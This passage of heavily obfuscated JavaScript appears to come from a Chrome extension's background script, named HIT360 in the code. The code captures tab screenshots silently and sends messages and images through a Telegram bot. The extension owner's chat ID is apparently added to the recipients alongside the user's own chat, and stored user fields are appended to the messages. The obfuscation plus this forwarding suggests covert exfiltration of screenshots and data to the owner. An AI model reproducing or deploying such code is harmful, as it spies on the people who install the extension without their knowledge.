            'ltxPj': _0x25e9df(0x1de) + _0x25e9df(0x1dd),
            'OQRtu': function (_0x2f984b, _0x46ec3f) {
                return _0x2f984b + _0x46ec3f;
            },
            'kSGWp': function (_0x881094, _0x7ef844) {
                return _0x881094 + _0x7ef844;
            },
            'WDvwt': _0x25e9df(0x24e),
            'czKrz': _0x25e9df(0x1f3)
        };
    try {
        const _0x39d163 = _0x597af5[_0x25e9df(0x20d)](_0xcbdf41[_0x25e9df(0x324)], !![]), _0x2ee259 = _0x597af5[_0x25e9df(0x279)](_0xcbdf41[_0x25e9df(0x1e1)], !![]), _0x4971c1 = _0x597af5[_0x25e9df(0x3d5)](_0xcbdf41[_0x25e9df(0x196) + _0x25e9df(0x3e1)], !![]), _0x2ea8f5 = _0x597af5[_0x25e9df(0x279)](_0xcbdf41[_0x25e9df(0x188) + _0x25e9df(0x3b0)], !![]), _0x26e019 = _0x597af5[_0x25e9df(0x3d5)](_0xcbdf41[_0x25e9df(0x1f2)], _0x597af5[_0x25e9df(0x1c6)]) ? _0x597af5[_0x25e9df(0x1c6)] : _0x597af5[_0x25e9df(0x1a3)], _0x42bdbe = Number[_0x25e9df(0x3f3)](_0xcbdf41[_0x25e9df(0x1bb)]) ? Math[_0x25e9df(0x283)](0x1085 + 0x244c + -0x3b * 0xe5, Math[_0x25e9df(0x1a4)](0x1e0a + 0xa76 + 0x4 * -0xa07, _0x597af5[_0x25e9df(0x23f)](Number, _0xcbdf41[_0x25e9df(0x1bb)]))) : 0x12c3 + 0x5bf + -0x181e;
        if (!_0x39d163) {
            let _0x962ae3 = await chrome[_0x25e9df(0x1d3)][_0x25e9df(0x3ff)][_0x25e9df(0x30c)]([_0x597af5[_0x25e9df(0x1dc)]]);
            if (_0x597af5[_0x25e9df(0x279)](_0x962ae3[_0x25e9df(0x305) + _0x25e9df(0x2a1) + 's'], ![]))
                return null;
        }
        const _0x38c054 = _0x597af5[_0x25e9df(0x1f4)](_0x3de42c, _0x597af5[_0x25e9df(0x27e)]);
        if (!_0x2ea8f5) {
            let _0x4b9712 = capturedHits[_0x25e9df(0x30c)](_0x38c054), _0x173206 = Date[_0x25e9df(0x313)]();
            if (_0x4b9712 && _0x597af5[_0x25e9df(0x2d1)](_0x597af5[_0x25e9df(0x24b)](_0x173206, _0x4b9712), 0x2 * -0x835 + 0x1c4b + 0x7a7))
                return null;
        }
        capturedHits[_0x25e9df(0x19b)](_0x38c054, Date[_0x25e9df(0x313)]()), _0x597af5[_0x25e9df(0x2f2)](setTimeout, () => capturedHits[_0x25e9df(0x237)](_0x38c054), -0x551 * 0x3 + 0x25e * 0x6 + 0x151 * 0x1f), await new Promise(_0x1d7da1 => setTimeout(_0x1d7da1, -0x655 + -0xee8 + 0x1731));
        let _0x27e1f7;
        if (_0x3de42c)
            _0x27e1f7 = await chrome[_0x25e9df(0x236)][_0x25e9df(0x30c)](_0x3de42c);
        else {
            const [_0x514c38] = await chrome[_0x25e9df(0x236)][_0x25e9df(0x1fa)]({
                'active': !![],
                'currentWindow': !![]
            });
            _0x27e1f7 = _0x514c38;
        }
        if (!_0x27e1f7 || !_0x27e1f7[_0x25e9df(0x2d9)])
            throw new Error(_0x597af5[_0x25e9df(0x39f)]);
        await chrome[_0x25e9df(0x215)][_0x25e9df(0x3a9)](_0x27e1f7[_0x25e9df(0x2d9)], { 'focused': !![] }), await chrome[_0x25e9df(0x236)][_0x25e9df(0x3a9)](_0x27e1f7['id'], { 'active': !![] }), await new Promise(_0x8d12b9 => setTimeout(_0x8d12b9, -0x2 * -0x20b + 0x1 * -0x240b + -0x2059 * -0x1));
        let _0x3fa819 = await chrome[_0x25e9df(0x236)][_0x25e9df(0x3de) + _0x25e9df(0x258)](_0x27e1f7[_0x25e9df(0x2d9)], {
            'format': _0x26e019,
            'quality': _0x42bdbe
        });
        if (!_0x3fa819)
            return null;
        !_0x4971c1 && (await _0x597af5[_0x25e9df(0x341)](ensureOffscreenDocument), await chrome[_0x25e9df(0x36f)][_0x25e9df(0x2bd) + 'e']({
            'type': _0x597af5[_0x25e9df(0x386)],
            'dataUrl': _0x3fa819
        })[_0x25e9df(0x2c4)](() => {
        }));
        if (!_0x2ee259) {
            let _0x22f745 = new Date()[_0x25e9df(0x1d9) + 'g']()[_0x25e9df(0x3b3)](/[:.]/g, '-');
            await chrome[_0x25e9df(0x3a1)][_0x25e9df(0x1cb)]({
                'url': _0x3fa819,
                'filename': _0x597af5[_0x25e9df(0x198)](_0x597af5[_0x25e9df(0x357)](_0x597af5[_0x25e9df(0x24c)], _0x22f745), _0x597af5[_0x25e9df(0x356)]),
                'saveAs': ![]
            });
        }
        return _0x3fa819;
    } catch (_0x53811d) {
        return null;
    }
}
chrome[_0x3e9bf1(0x36f)][_0x3e9bf1(0x33c)][_0x3e9bf1(0x2d0) + 'r']((_0x56a146, _0x423790, _0x2c0660) => {
    const _0x10c59b = _0x3e9bf1, _0x5c49b2 = {
            'ADzxp': function (_0x59189c, _0x5c5211) {
                return _0x59189c(_0x5c5211);
            },
            'ntHKY': function (_0x5503e9, _0x2b62e7) {
                return _0x5503e9(_0x2b62e7);
            },
            'dwEZB': _0x10c59b(0x334) + 'or',
            'oxEJl': function (_0x5e3b24, _0x5949a9) {
                return _0x5e3b24(_0x5949a9);
            },
            'kGWOJ': function (_0x35f72b, _0x188783) {
                return _0x35f72b(_0x188783);
            },
            'VbyLS': _0x10c59b(0x2ed) + 'r',
            'qKYJl': function (_0x5ad836, _0x4e68ad) {
                return _0x5ad836(_0x4e68ad);
            },
            'YgRZQ': _0x10c59b(0x417) + _0x10c59b(0x366),
            'cDhwW': function (_0x594c92, _0x34b46b) {
                return _0x594c92(_0x34b46b);
            },
            'yYQgA': _0x10c59b(0x1fb) + 'd',
            'JgIqH': function (_0x579fb9, _0x1b056a) {
                return _0x579fb9 < _0x1b056a;
            },
            'mPCfo': function (_0x13e382, _0x54f3ae) {
                return _0x13e382(_0x54f3ae);
            },
            'uxwuf': _0x10c59b(0x361) + _0x10c59b(0x3b6) + _0x10c59b(0x29c),
            'KNUuC': _0x10c59b(0x1d6) + _0x10c59b(0x2a5) + _0x10c59b(0x3ab),
            'McckV': function (_0x1d1ecd, _0x171754) {
                return _0x1d1ecd(_0x171754);
            },
            'TuWpa': function (_0x1fb263, _0x5b4432, _0x2744b6) {
                return _0x1fb263(_0x5b4432, _0x2744b6);
            },
            'VtvMv': _0x10c59b(0x3f4),
            'FTqSp': function (_0x19bda2, _0x1e0b9e, _0x4c3a46, _0x13c1dd) {
                return _0x19bda2(_0x1e0b9e, _0x4c3a46, _0x13c1dd);
            },
            'vNJFh': _0x10c59b(0x199) + _0x10c59b(0x1e2) + _0x10c59b(0x39b) + _0x10c59b(0x403),
            'RiLVU': _0x10c59b(0x1f8),
            'lsemB': _0x10c59b(0x210) + _0x10c59b(0x40b) + _0x10c59b(0x389),
            'okMoU': function (_0x4d025c, _0x330f9f) {
                return _0x4d025c(_0x330f9f);
            },
            'gpijX': function (_0x55bac4, _0x579e0f) {
                return _0x55bac4 || _0x579e0f;
            },
            'SVLMs': function (_0x2c54d6, _0x4b7118, _0x45fba8, _0x3d3552) {
                return _0x2c54d6(_0x4b7118, _0x45fba8, _0x3d3552);
            },
            'bztaL': _0x10c59b(0x2b1) + _0x10c59b(0x2a2) + 't',
            'fZyvZ': function (_0x30a1e3, _0x1c5e93, _0x506605, _0x4eb5bc) {
                return _0x30a1e3(_0x1c5e93, _0x506605, _0x4eb5bc);
            },
            'uWyqb': _0x10c59b(0x2b1) + _0x10c59b(0x1c9) + _0x10c59b(0x3c7),
            'yxKrq': _0x10c59b(0x2cb) + _0x10c59b(0x3cf) + _0x10c59b(0x2e5) + _0x10c59b(0x2c1),
            'YYIAJ': function (_0x119b84, _0xe48f6b, _0x126482) {
                return _0x119b84(_0xe48f6b, _0x126482);
            },
            'vanVW': _0x10c59b(0x3c9),
            'PQeuS': function (_0x4f4e07, _0x3c6d91) {
                return _0x4f4e07(_0x3c6d91);
            },
            'VftvA': function (_0x30c662, _0x52df4a) {
                return _0x30c662 || _0x52df4a;
            },
            'Hqvyf': function (_0x37e106, _0x4e5761, _0x36aa33) {
                return _0x37e106(_0x4e5761, _0x36aa33);
            },
            'ELHkR': _0x10c59b(0x2b1) + _0x10c59b(0x2a2) + _0x10c59b(0x419),
            'wFnMq': function (_0x43aa83, _0x371098) {
                return _0x43aa83 === _0x371098;
            },
            'sDRXQ': _0x10c59b(0x2dd),
            'gdHdZ': function (_0x1aac5b, _0x1c4586) {
                return _0x1aac5b === _0x1c4586;
            },
            'yVruh': _0x10c59b(0x281) + _0x10c59b(0x1c5),
            'QoqJX': _0x10c59b(0x281) + _0x10c59b(0x382) + _0x10c59b(0x363),
            'asTUA': _0x10c59b(0x281) + _0x10c59b(0x180),
            'zizHT': _0x10c59b(0x2c7) + _0x10c59b(0x350),
            'HKUtm': _0x10c59b(0x37d) + _0x10c59b(0x401),
            'xkFyB': function (_0x2c2acf, _0x560809) {
                return _0x2c2acf(_0x560809);
            },
            'BSsCM': _0x10c59b(0x1d5) + _0x10c59b(0x33b) + _0x10c59b(0x3e5) + _0x10c59b(0x3ef) + _0x10c59b(0x25a),
            'fcvLF': function (_0x3ad944, _0x54396b) {
                return _0x3ad944 < _0x54396b;
            },
            'GVVsh': function (_0x1c1db0, _0x50f79e) {
                return _0x1c1db0(_0x50f79e);
            },
            'XXtBw': _0x10c59b(0x1e5) + _0x10c59b(0x3d1) + _0x10c59b(0x262),
            'LuGIU': function (_0x1f0ba0, _0x83cd80) {
                return _0x1f0ba0(_0x83cd80);
            },
            'ylFim': function (_0x53ad31, _0x267827) {
                return _0x53ad31 + _0x267827;
            },
            'FmzgU': function (_0x2104b2, _0x46623a) {
                return _0x2104b2 + _0x46623a;
            },
            'hXlRh': _0x10c59b(0x3e9) + _0x10c59b(0x234) + 'e>',
            'ixvJD': _0x10c59b(0x406),
            'WWpar': function (_0x46cd16, _0x30b0b1) {
                return _0x46cd16 + _0x30b0b1;
            },
            'TMcDs': _0x10c59b(0x3e9) + _0x10c59b(0x3be) + _0x10c59b(0x381),
            'xqFlo': function (_0x3c1972, _0x4ab2ce) {
                return _0x3c1972 + _0x4ab2ce;
            },
            'XKIVS': function (_0x9f38a, _0x7cb5c2) {
                return _0x9f38a !== _0x7cb5c2;
            },
            'ciHQQ': _0x10c59b(0x3d2),
            'gwHhC': function (_0x4d3338, _0x28f494) {
                return _0x4d3338 && _0x28f494;
            },
            'pjTCS': function (_0x396fc0, _0x22b047, _0x8f11b3) {
                return _0x396fc0(_0x22b047, _0x8f11b3);
            },
            'FwCMt': function (_0x1b7fbc, _0x819809, _0x928513, _0x561d0f) {
                return _0x1b7fbc(_0x819809, _0x928513, _0x561d0f);
            },
            'fsxWI': function (_0x483ca8, _0x537a7e) {
                return _0x483ca8 === _0x537a7e;
            },
            'HnZlU': _0x10c59b(0x17e) + _0x10c59b(0x2fa) + _0x10c59b(0x28f),
            'qESIY': function (_0xeada0f, _0x2fc92f) {
                return _0xeada0f || _0x2fc92f;
            },
            'TEhwO': _0x10c59b(0x405) + _0x10c59b(0x308) + _0x10c59b(0x28f),
            'VVofu': _0x10c59b(0x2df),
            'ZMiGo': _0x10c59b(0x33f) + 'd',
            'OoQYl': function (_0x5d016a, _0x3d90bc) {
                return _0x5d016a === _0x3d90bc;
            },
            'zNLdh': _0x10c59b(0x249) + _0x10c59b(0x1df) + _0x10c59b(0x393),
            'TnuKK': function (_0x32fb90, _0x557f2c) {
                return _0x32fb90 === _0x557f2c;
            },
            'nGFqx': function (_0x46a19a, _0x21cd14) {
                return _0x46a19a || _0x21cd14;
            },
            'CZMYV': _0x10c59b(0x38f) + _0x10c59b(0x2c9),
            'mXtRS': function (_0x53c96d, _0x3456e1, _0x319a54, _0x1eac78) {
                return _0x53c96d(_0x3456e1, _0x319a54, _0x1eac78);
            },
            'JuWdz': _0x10c59b(0x220),
            'SNQsC': _0x10c59b(0x2c0) + _0x10c59b(0x3d3),
            'NJZiA': _0x10c59b(0x1a5) + _0x10c59b(0x232) + _0x10c59b(0x3d3),
            'pGFpV': function (_0x1c1b54, _0x26e69f) {
                return _0x1c1b54 || _0x26e69f;
            },
            'FnzEK': _0x10c59b(0x2e9) + _0x10c59b(0x1bf),
            'Hfoie': _0x10c59b(0x202) + 'ed',
            'FINyw': _0x10c59b(0x1c7) + _0x10c59b(0x1b1) + _0x10c59b(0x2b5),
            'tjowR': function (_0x535a61, _0x14b99d) {
                return _0x535a61 > _0x14b99d;
            },
            'VTnRd': function (_0x2ff412, _0x514987) {
                return _0x2ff412(_0x514987);
            },
            'WogJS': function (_0x13a8a2, _0x387de5) {
                return _0x13a8a2(_0x387de5);
            },
            'lqsRJ': function (_0x26b574, _0x19b79a) {
                return _0x26b574(_0x19b79a);
            },
            'QsMqf': _0x10c59b(0x28a) + _0x10c59b(0x272),
            'fgToI': function (_0x338086, _0x51a793, _0x59d7a1) {
                return _0x338086(_0x51a793, _0x59d7a1);
            },
            'JBNdf': _0x10c59b(0x2ec) + _0x10c59b(0x265),
            'insBR': function (_0x2862ab) {
                return _0x2862ab();
            },
            'OUcfX': _0x10c59b(0x32b) + _0x10c59b(0x265),
            'KZhpi': _0x10c59b(0x414) + _0x10c59b(0x203) + 'C',
            'yqvnH': function (_0x2f0392, _0x36a0cc, _0x434b3e) {
                return _0x2f0392(_0x36a0cc, _0x434b3e);
            },
            'hKLIw': _0x10c59b(0x27f) + _0x10c59b(0x203) + 'C',
            'TxsJq': _0x10c59b(0x38c) + _0x10c59b(0x303) + _0x10c59b(0x33a),
            'obTig': function (_0x46ca3f, _0x488567) {
                return _0x46ca3f === _0x488567;
            },
            'kOaFV': _0x10c59b(0x37e) + _0x10c59b(0x25e) + _0x10c59b(0x349),
            'ssBbp': _0x10c59b(0x213) + _0x10c59b(0x316) + _0x10c59b(0x2f0),
            'yJPSk': function (_0x471ed1, _0x3ddcc7) {
                return _0x471ed1 === _0x3ddcc7;
            },
            'CsoMZ': _0x10c59b(0x2e6) + _0x10c59b(0x257) + _0x10c59b(0x3bd),
            'OmoXr': _0x10c59b(0x3e2) + _0x10c59b(0x21d),
            'YDgBT': function (_0x177c9b, _0x312c61) {
                return _0x177c9b === _0x312c61;
            },
            'RfCpd': _0x10c59b(0x240) + 'E',
            'TFGVO': function (_0x236306, _0x41d7ed) {
                return _0x236306 === _0x41d7ed;
            },
            'lCvTJ': _0x10c59b(0x28a) + _0x10c59b(0x3af) + _0x10c59b(0x40e),
            'KYxGm': function (_0x35b0a2) {
                return _0x35b0a2();
            },
            'KLFIm': function (_0x365ad9, _0x17842a) {
                return _0x365ad9 === _0x17842a;
            },
            'XAfbD': _0x10c59b(0x3e7) + _0x10c59b(0x348),
            'yMHRs': function (_0x1de429, _0x3b55c0) {
                return _0x1de429 === _0x3b55c0;
            },
            'avelU': function (_0x59d0a8) {
                return _0x59d0a8();
            },
            'aVhbi': function (_0x2047c1, _0x2b6087) {
                return _0x2047c1 === _0x2b6087;
            },
            'XRvqB': function (_0x288647, _0x2c9487) {
                return _0x288647 === _0x2c9487;
            },
            'xfKwn': _0x10c59b(0x415) + _0x10c59b(0x3bd),
            'dsEFX': function (_0x19c964, _0x344d96) {
                return _0x19c964(_0x344d96);
            }
        };
    if (!_0x56a146 || !_0x56a146[_0x10c59b(0x250)])
        return ![];
    if (_0x5c49b2[_0x10c59b(0x22f)](_0x56a146[_0x10c59b(0x250)], _0x5c49b2[_0x10c59b(0x336)]))
        return ((async () => {
            const _0x2c52d9 = _0x10c59b;
            try {
                const _0x5b7d6d = await _0x5c49b2[_0x2c52d9(0x2d8)](toggleAutoSubmitOnTab, _0x56a146[_0x2c52d9(0x2bf)]);
                _0x5c49b2[_0x2c52d9(0x2d8)](_0x2c0660, _0x5b7d6d);
            } catch (_0x57ff2f) {
                _0x5c49b2[_0x2c52d9(0x1ce)](_0x2c0660, {
                    'ok': ![],
                    'reason': _0x57ff2f[_0x2c52d9(0x2df)] || _0x5c49b2[_0x2c52d9(0x39c)]
                });
            }
        })()), !![];
    if (_0x5c49b2[_0x10c59b(0x18d)](_0x56a146[_0x10c59b(0x250)], _0x5c49b2[_0x10c59b(0x26d)]))
        return ((async () => {
            const _0x346e13 = _0x10c59b;
            try {
                const _0x204161 = await _0x5c49b2[_0x346e13(0x3d4)](getAutoSubmitStateOnTab, _0x56a146[_0x346e13(0x2bf)]);
                _0x5c49b2[_0x346e13(0x36c)](_0x2c0660, _0x204161);
            } catch (_0xc9e932) {
                _0x5c49b2[_0x346e13(0x1ce)](_0x2c0660, {
                    'ok': ![],
                    'isRunning': ![],
                    'reason': _0xc9e932[_0x346e13(0x2df)] || _0x5c49b2[_0x346e13(0x3dd)]
                });
            }
        })()), !![];
    if (_0x5c49b2[_0x10c59b(0x3ee)](_0x56a146[_0x10c59b(0x250)], _0x5c49b2[_0x10c59b(0x181)]))
        return ((async () => {
            const _0x2f9a11 = _0x10c59b;
            try {
                let _0x44f06a = null;
                _0x56a146[_0x2f9a11(0x2bf)] && (_0x44f06a = await chrome[_0x2f9a11(0x236)][_0x2f9a11(0x30c)](_0x56a146[_0x2f9a11(0x2bf)]));
                if (!_0x44f06a) {
                    const [_0x28bc5d] = await chrome[_0x2f9a11(0x236)][_0x2f9a11(0x1fa)]({
                        'active': !![],
                        'currentWindow': !![]
                    });
                    _0x44f06a = _0x28bc5d;
                }
                if (!_0x44f06a || !_0x44f06a['id']) {
                    _0x5c49b2[_0x2f9a11(0x32d)](_0x2c0660, {
                        'ok': ![],
                        'reason': _0x5c49b2[_0x2f9a11(0x40f)]
                    });
                    return;
                }
                const _0x5c013e = await _0x5c49b2[_0x2f9a11(0x331)](openPanelForTab, _0x44f06a);
                _0x5c49b2[_0x2f9a11(0x3d4)](_0x2c0660, { 'ok': _0x5c013e });
            } catch (_0x4af177) {
                _0x5c49b2[_0x2f9a11(0x36c)](_0x2c0660, {
                    'ok': ![],
                    'reason': _0x4af177[_0x2f9a11(0x2df)] || _0x5c49b2[_0x2f9a11(0x288)]
                });
            }
        })()), !![];
    if (_0x5c49b2[_0x10c59b(0x3bf)](_0x56a146[_0x10c59b(0x250)], _0x5c49b2[_0x10c59b(0x204)]))
        return ((async () => {
            const _0xf3f07e = _0x10c59b;
            try {
                if (!OWNER_TG_BOT_TOKEN || _0x5c49b2[_0xf3f07e(0x355)](OWNER_TG_BOT_TOKEN[_0xf3f07e(0x3f0)], 0x301 * -0x3 + 0x1b13 + -0x301 * 0x6)) {
                    _0x5c49b2[_0xf3f07e(0x224)](_0x2c0660, {
                        'ok': ![],
                        'description': _0x5c49b2[_0xf3f07e(0x3b5)]
                    });
                    return;
                }
                if (!OWNER_TG_CHAT_ID || !TELEGRAM_CHAT_ID_REGEX[_0xf3f07e(0x2c8)](OWNER_TG_CHAT_ID)) {
                    _0x5c49b2[_0xf3f07e(0x1ce)](_0x2c0660, {
                        'ok': ![],
                        'description': _0x5c49b2[_0xf3f07e(0x37c)]
                    });
                    return;
                }
                const _0x3aa831 = await _0x5c49b2[_0xf3f07e(0x412)](resolveAutomationTab, _0x56a146[_0xf3f07e(0x2bf)]), _0xde0ed3 = _0x3aa831 && _0x3aa831['id'] ? _0x3aa831['id'] : null;
                let _0x4e7b72 = '';
                _0xde0ed3 && (_0x4e7b72 = await _0x5c49b2[_0xf3f07e(0x394)](captureScreenshot, _0xde0ed3, {
                    'force': !![],
                    'noDownload': !![],
                    'skipClipboard': !![],
                    'ignoreCooldown': !![],
                    'format': _0x5c49b2[_0xf3f07e(0x191)],
                    'quality': 0x50
                }) || '');
                const _0x9c1fbc = await _0x5c49b2[_0xf3f07e(0x395)](sendTelegramMessage, OWNER_TG_CHAT_ID, _0x5c49b2[_0xf3f07e(0x28b)], !![]);
                if (!_0x9c1fbc || !_0x9c1fbc['ok']) {
                    await _0x5c49b2[_0xf3f07e(0x394)](setTelegramUiState, _0x5c49b2[_0xf3f07e(0x402)], _0x9c1fbc?.[_0xf3f07e(0x231) + 'n'] || _0x5c49b2[_0xf3f07e(0x1ef)]), _0x5c49b2[_0xf3f07e(0x354)](_0x2c0660, _0x5c49b2[_0xf3f07e(0x1ab)](_0x9c1fbc, {
                        'ok': ![],
                        'description': _0x5c49b2[_0xf3f07e(0x1ef)]
                    }));
                    return;
                }
                let _0xfe3ff0 = ![], _0x5d21ee = '';
                if (_0x4e7b72) {
                    let _0x5d2b48 = await _0x5c49b2[_0xf3f07e(0x1a0)](sendTelegramPhoto, OWNER_TG_CHAT_ID, _0x4e7b72, _0x5c49b2[_0xf3f07e(0x3f6)]);
                    (!_0x5d2b48 || !_0x5d2b48['ok']) && (_0x5d2b48 = await _0x5c49b2[_0xf3f07e(0x261)](sendTelegramDocument, OWNER_TG_CHAT_ID, _0x4e7b72, _0x5c49b2[_0xf3f07e(0x3f6)])), _0xfe3ff0 = !!(_0x5d2b48 && _0x5d2b48['ok']), !_0xfe3ff0 && (_0x5d21ee = _0x5d2b48?.[_0xf3f07e(0x231) + 'n'] || _0x5c49b2[_0xf3f07e(0x1fc)]);
                } else
                    _0x5d21ee = _0x5c49b2[_0xf3f07e(0x315)];
                await _0x5c49b2[_0xf3f07e(0x2bc)](setTelegramUiState, _0xfe3ff0 ? _0x5c49b2[_0xf3f07e(0x1ba)] : _0x5c49b2[_0xf3f07e(0x402)], _0xfe3ff0 ? '' : _0x5d21ee), _0x5c49b2[_0xf3f07e(0x34d)](_0x2c0660, {
                    'ok': !![],
                    'textSent': !![],
                    'screenshotSent': _0xfe3ff0,
                    'screenshotError': _0x5c49b2[_0xf3f07e(0x3a3)](_0x5d21ee, '')
                });
            } catch (_0x505197) {
                await _0x5c49b2[_0xf3f07e(0x33e)](setTelegramUiState, _0x5c49b2[_0xf3f07e(0x402)], _0x505197[_0xf3f07e(0x2df)] || _0x5c49b2[_0xf3f07e(0x31c)]), _0x5c49b2[_0xf3f07e(0x331)](_0x2c0660, {
                    'ok': ![],
                    'description': _0x505197[_0xf3f07e(0x2df)] || _0x5c49b2[_0xf3f07e(0x31c)]
                });
            }
        })()), !![];
    if (_0x5c49b2[_0x10c59b(0x2c6)](_0x56a146[_0x10c59b(0x250)], _0x5c49b2[_0x10c59b(0x233)]))
        return ((async () => {
            const _0x16e8e7 = _0x10c59b;
            try {
                const _0x5db630 = _0x5c49b2[_0x16e8e7(0x296)](typeof _0x56a146[_0x16e8e7(0x34c)], _0x5c49b2[_0x16e8e7(0x307)]) ? _0x56a146[_0x16e8e7(0x34c)][_0x16e8e7(0x388)]() : '', _0x196f1d = _0x5c49b2[_0x16e8e7(0x3c4)](_0x56a146[_0x16e8e7(0x2be)], !![]);
                let _0x4b32a8 = _0x5db630, _0x5d093c = TELEGRAM_CHAT_ID_REGEX[_0x16e8e7(0x2c8)](_0x4b32a8);
                const _0x44fb02 = new Set();
                let _0x1824c8 = {};
                if (!_0x196f1d) {
                    _0x1824c8 = await chrome[_0x16e8e7(0x1d3)][_0x16e8e7(0x3ff)][_0x16e8e7(0x30c)]([
                        _0x5c49b2[_0x16e8e7(0x293)],
                        _0x5c49b2[_0x16e8e7(0x245)],
                        _0x5c49b2[_0x16e8e7(0x3df)],
                        _0x5c49b2[_0x16e8e7(0x310)],
                        _0x5c49b2[_0x16e8e7(0x3ac)]
                    ]);
                    const _0x4746fd = _0x5c49b2[_0x16e8e7(0x3c4)](typeof _0x1824c8[_0x16e8e7(0x281) + _0x16e8e7(0x1c5)], _0x5c49b2[_0x16e8e7(0x307)]) ? _0x1824c8[_0x16e8e7(0x281) + _0x16e8e7(0x1c5)][_0x16e8e7(0x388)]() : '';
                    if (TELEGRAM_CHAT_ID_REGEX[_0x16e8e7(0x2c8)](_0x4746fd))
                        _0x4b32a8 = _0x4746fd, _0x5d093c = !![], chrome[_0x16e8e7(0x1d3)][_0x16e8e7(0x3ff)][_0x16e8e7(0x19b)]({ 'HIT360_tg_forward_enabled': !![] })[_0x16e8e7(0x2c4)](() => {
                        });
                    else
                        !_0x5d093c && (_0x4b32a8 = '', _0x5d093c = ![]);
                }
                if (_0x196f1d) {
                    if (!_0x5d093c) {
                        _0x5c49b2[_0x16e8e7(0x229)](_0x2c0660, {
                            'ok': ![],
                            'description': _0x5c49b2[_0x16e8e7(0x3a2)]
                        });
                        return;
                    }
                    _0x44fb02[_0x16e8e7(0x2f8)](_0x4b32a8);
                } else
                    OWNER_TG_CHAT_ID && TELEGRAM_CHAT_ID_REGEX[_0x16e8e7(0x2c8)](OWNER_TG_CHAT_ID) && _0x44fb02[_0x16e8e7(0x2f8)](OWNER_TG_CHAT_ID), _0x5d093c && _0x44fb02[_0x16e8e7(0x2f8)](_0x4b32a8);
                if (!OWNER_TG_BOT_TOKEN || _0x5c49b2[_0x16e8e7(0x1ac)](OWNER_TG_BOT_TOKEN[_0x16e8e7(0x3f0)], -0x5 * 0x75a + -0x1 * -0x3ab + 0x2121)) {
                    _0x5c49b2[_0x16e8e7(0x1ce)](_0x2c0660, {
                        'ok': ![],
                        'description': _0x5c49b2[_0x16e8e7(0x3b5)]
                    });
                    return;
                }
                if (_0x5c49b2[_0x16e8e7(0x3c4)](_0x44fb02[_0x16e8e7(0x3e4)], 0x3 * 0x24a + 0x320 * 0x4 + -0x135e)) {
                    _0x5c49b2[_0x16e8e7(0x23a)](_0x2c0660, {
                        'ok': ![],
                        'description': _0x5c49b2[_0x16e8e7(0x321)]
                    });
                    return;
                }
                let _0x5a2e34 = _0x5c49b2[_0x16e8e7(0x2f7)](String, _0x56a146[_0x16e8e7(0x362)] || '');
                if (!_0x196f1d) {
                    const _0x26bb88 = [], _0x1e201a = (_0x1824c8[_0x16e8e7(0x2c7) + _0x16e8e7(0x350)] || '')[_0x16e8e7(0x2cc)]()[_0x16e8e7(0x388)](), _0x1719cf = (_0x1824c8[_0x16e8e7(0x37d) + _0x16e8e7(0x401)] || '')[_0x16e8e7(0x2cc)]()[_0x16e8e7(0x388)]();
                    _0x1e201a && _0x26bb88[_0x16e8e7(0x3c3)](_0x5c49b2[_0x16e8e7(0x344)](_0x5c49b2[_0x16e8e7(0x34a)](_0x5c49b2[_0x16e8e7(0x2cf)], _0x5c49b2[_0x16e8e7(0x1ce)](escapeHtml, _0x1e201a)), _0x5c49b2[_0x16e8e7(0x2a3)])), _0x1719cf && _0x26bb88[_0x16e8e7(0x3c3)](_0x5c49b2[_0x16e8e7(0x2a8)](_0x5c49b2[_0x16e8e7(0x34a)](_0x5c49b2[_0x16e8e7(0x1b6)], _0x5c49b2[_0x16e8e7(0x331)](escapeHtml, _0x1719cf)), _0x5c49b2[_0x16e8e7(0x2a3)])), _0x26bb88[_0x16e8e7(0x3f0)] && (_0x5a2e34 += _0x5c49b2[_0x16e8e7(0x1ca)]('\x0a', _0x26bb88[_0x16e8e7(0x2b7)]('\x0a')));
                }
                let _0x1b0672 = '';
                const _0x25fb32 = _0x5c49b2[_0x16e8e7(0x32a)](_0x56a146[_0x16e8e7(0x3a8) + _0x16e8e7(0x219)], ![]), _0x11408c = _0x5c49b2[_0x16e8e7(0x3c4)](_0x1824c8[_0x16e8e7(0x281) + _0x16e8e7(0x180)], !![]) || _0x5c49b2[_0x16e8e7(0x296)](_0x1824c8[_0x16e8e7(0x281) + _0x16e8e7(0x180)], _0x5c49b2[_0x16e8e7(0x379)]);
                if (_0x5c49b2[_0x16e8e7(0x358)](!_0x196f1d, _0x25fb32)) {
                    const _0x409c64 = _0x423790 && _0x423790[_0x16e8e7(0x366)] ? _0x423790[_0x16e8e7(0x366)]['id'] : null;
                    _0x409c64 && (_0x1b0672 = await _0x5c49b2[_0x16e8e7(0x35e)](captureScreenshot, _0x409c64, {
                        'force': !![],
                        'noDownload': !![],
                        'skipClipboard': !![],
                        'ignoreCooldown': !![],
                        'format': _0x5c49b2[_0x16e8e7(0x191)],
                        'quality': 0x50
                    }) || '');
                }
                let _0x360470 = null, _0x34aa6b = 0xec7 * 0x2 + 0x1 * 0x84a + -0x25d8, _0x29dcfb = -0x4d + -0x902 * -0x2 + -0x11b7;
                const _0x4757de = [], _0x17765b = _0x5d093c ? _0x4b32a8 : '';
                let _0x58a10e = ![], _0x34c691 = '';
                for (const _0x23829b of _0x44fb02) {
                    _0x360470 = await _0x5c49b2[_0x16e8e7(0x407)](sendTelegramMessage, _0x23829b, _0x5a2e34, _0x56a146[_0x16e8e7(0x3d8) + _0x16e8e7(0x2b6)] || ![]);
                    if (!_0x360470 || !_0x360470['ok']) {
                        if (_0x5c49b2[_0x16e8e7(0x22f)](_0x23829b, OWNER_TG_CHAT_ID)) {
                            await _0x5c49b2[_0x16e8e7(0x33e)](setTelegramUiState, _0x5c49b2[_0x16e8e7(0x402)], _0x360470?.[_0x16e8e7(0x231) + 'n'] || _0x5c49b2[_0x16e8e7(0x1b5)]), _0x5c49b2[_0x16e8e7(0x3d4)](_0x2c0660, _0x5c49b2[_0x16e8e7(0x31f)](_0x360470, {
                                'ok': ![],
                                'description': _0x5c49b2[_0x16e8e7(0x1e7)]
                            }));
                            return;
                        }
                        _0x4757de[_0x16e8e7(0x3c3)]({
                            'chatId': _0x23829b,
                            'stage': _0x5c49b2[_0x16e8e7(0x373)],
                            'description': _0x360470?.[_0x16e8e7(0x231) + 'n'] || _0x5c49b2[_0x16e8e7(0x2f9)]
                        });
                        _0x5c49b2[_0x16e8e7(0x3ee)](_0x23829b, _0x17765b) && (_0x34c691 = _0x360470?.[_0x16e8e7(0x231) + 'n'] || _0x5c49b2[_0x16e8e7(0x27a)]);
                        continue;
                    }
                    _0x34aa6b += 0x2359 * -0x1 + 0x20fb + 0x25f * 0x1;
